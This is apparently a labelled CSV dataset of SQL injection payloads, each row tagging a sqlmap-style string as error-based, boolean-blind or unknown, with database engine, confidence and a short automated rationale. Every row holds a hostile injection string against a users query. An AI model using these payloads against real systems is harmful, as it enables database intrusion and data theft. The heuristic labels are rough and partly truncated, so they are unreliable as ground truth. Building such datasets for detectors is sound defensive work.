id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39770,"select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39771,"1%\' ) ) ) or username = ""-1254"" or username = ""-3499\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'nzap\' like \'nzap",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39772,"select * from users WHERE username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-8069\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39773,"select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1%\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39774,"select * from users WHERE username = ""1"" or username = ""1%"" and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39775,"select * from users WHERE username = ""-6353%\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) as pogx where 4105 = 4105",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39776,"1 ) and ( 3530 = 3530"" or username = ""-5863",unknown,generic,0.50,Insufficient data to classify payload type,1
39777,"SELECT * FROM users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" AND usErnamE = ""1\'|| ( sElEct \'tisi\' from dual whErE 1616 = 1616",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39778,"-5062 ) where 7457 = 7457 and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39779,"1 or username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" or username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx",unknown,generic,0.50,Insufficient data to classify payload type,1
39780,"-8860 ) and username = ""-5863"" and ""gkvy"" = ""gkvy",unknown,generic,0.50,Insufficient data to classify payload type,1
39781,"1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""-5863",unknown,generic,0.50,Insufficient data to classify payload type,1
39782,"select * from users WHERE username = ""1\' ) and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""-1190\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39783,"-7430\' ) as xfah where 1596 = 1596 and username = ""-7199\' or username = ""-1190\' and ( ( ( 1248 = 1248",unknown,generic,0.50,Insufficient data to classify payload type,1
39784,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'jzpb\' = \'jzpb"" or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39785,-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39786,"-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39787,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-1254"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39788,"select * from users WHERE username = ""1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1 ) ) and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39789,"1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39790,"-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) or username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39791,"1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39792,"1 ) ) ) and username = ""-1549\' ) or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39793,"-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39794,"select * from users WHERE username = ""-5863"" and username = ""1"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39795,-6665\' ) ) ) and ( ( ( \'winx\' = \'winx,unknown,generic,0.50,Insufficient data to classify payload type,1
39796,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39797,-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz,unknown,generic,0.50,Insufficient data to classify payload type,1
39798,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39799,1%\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk,unknown,generic,0.50,Insufficient data to classify payload type,1
39800,"select * from users WHERE username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" and username = ""1",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39801,"1"" and ( ( ( 6395 = 6395"" or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39802,"1\' ) or username = ""-1254"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39803,-6079 ) ) ) and ( ( ( 8708 = 8708,unknown,generic,0.50,Insufficient data to classify payload type,1
39804,"-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo",unknown,generic,0.50,Insufficient data to classify payload type,1
39805,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-1254"" and username = ""-7874 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39806,"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6353%\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39807,"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254"" and username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39808,"select * from users WHERE username = ""-1190\' or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-9564",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39809,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254"" and username = ""1%\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39810,"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""-6353%\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39811,"select * from users WHERE username = ""-7199\' or username = ""-7962\' ) ) as pgqz where 6058 = 6058 or username = ""-9847%\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39812,"select * from users WHERE username = ""-9501\' ) and username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39813,"1\'|| ( select \'vvpn\' from dual where 7011 = 7011 or username = ""-3424\' ) ) and username = ""1",boolean_blind,oracle,0.80,Boolean Blind detected: SQL structure with complex syn (oracle),1
39814,"select * from users WHERE username = ""-9987 ) ) ) or# ( ( ( 2114 = 2114"" or username = ""-2806\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39815,"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39816,"select * from users WHERE username = ""-7199\' and username = ""-9564 or username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39817,"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 or username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39818,"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""1 ) ) as dgso where 4654 = 4654",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39819,"select * from users WHERE username = ""-7199\' or username = ""1 or username = ""-4610\' ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39820,"select * from users WHERE username = ""1\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39821,"select * from users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39822,"1 and username = ""-8057\' ) ) as gpue where 4205 = 4205 || 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39823,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 and username = ""1"" and username = ""1"" or username = ""1\' where 8537 = 8537",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39824,"1\' ) ) ) or username = ""-5863"" and ( ( ( \'itxy\' like \'itxy",unknown,generic,0.50,Insufficient data to classify payload type,1
39825,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39826,"select * from users WHERE username = ""1%"" and ""%"" = """" and username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39827,"-1344 ) as gqgi where 2545 = 2545 or username = ""1 ) ) ) and ( ( ( 3505 = 3505",unknown,generic,0.50,Insufficient data to classify payload type,1
39828,"1\' ) and ( ( \'ajka\' = \'ajka"" and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248",unknown,generic,0.50,Insufficient data to classify payload type,1
39829,"1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39830,"-5863"" and ( ( \'%\' = \'"" or username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge",unknown,generic,0.50,Insufficient data to classify payload type,1
39831,"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39832,"-5863"" and ""gkvy"" = ""gkvy"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39833,"select * from users WHERE username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" and username = ""1 )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39834,"-6353%\' ) ) or username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki",unknown,generic,0.50,Insufficient data to classify payload type,1
39835,"select * from users WHERE username = ""-9644 ) ) and ( ( 5616 = 5616"" or ( \'%\' = \'"" or username = ""1\' ) as wpmv where 1479 = 1479",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39836,-1889%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
39837,"select * from users WHERE username = ""-3499\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-1254"" and username = ""-7072\' )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39838,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" or username = ""1\' ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39839,"1 where 5161 = 5161 and username = ""1"" and ( 3530 = 3530",unknown,generic,0.50,Insufficient data to classify payload type,1
39840,"select * from users WHERE username = ""1 and username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) as eltx where 9955 = 9955",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39841,-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp,unknown,generic,0.50,Insufficient data to classify payload type,1
